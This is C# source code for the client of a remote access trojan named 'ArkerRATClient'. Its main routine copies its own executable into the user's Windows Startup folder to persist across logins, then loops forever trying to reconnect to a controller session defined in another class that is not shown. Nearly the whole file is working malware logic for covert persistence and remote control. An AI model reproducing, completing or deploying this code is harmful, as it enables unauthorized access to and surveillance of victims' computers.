using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.Net;
using System.Threading;
using System.IO;
using System.Security.Principal;
using System.Runtime.CompilerServices;

namespace ArkerRATClient
{
    internal class Program
    {
        private static void Main(string[] args)
        {
            CopyItSelfToStartUp();
            while (true)
            {
                if (RATClientSession.noConnection)
                {
                    Connect();
                }
                Thread.Sleep(1000);
            }
        }

        private static async Task Connect()
        {
            try
            {
                if (!RATClientSession.uninstallFix)
                {
                    RATClientSession.ClientSession();
                }
            }
            catch(Exception ex) { RATClientSession.noConnection = true; }
        }

        private static void CopyItSelfToStartUp()
        {
            Task.Run(() =>
            {
                byte[] arkerRatFileBytes = File.ReadAllBytes(Directory.GetCurrentDirectory() + @"\" + AppDomain.CurrentDomain.FriendlyName);
                File.WriteAllBytes("C:\\Users\\"+Environment.UserName+"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"+ AppDomain.CurrentDomain.FriendlyName, arkerRatFileBytes);
            });
        }
    }
}
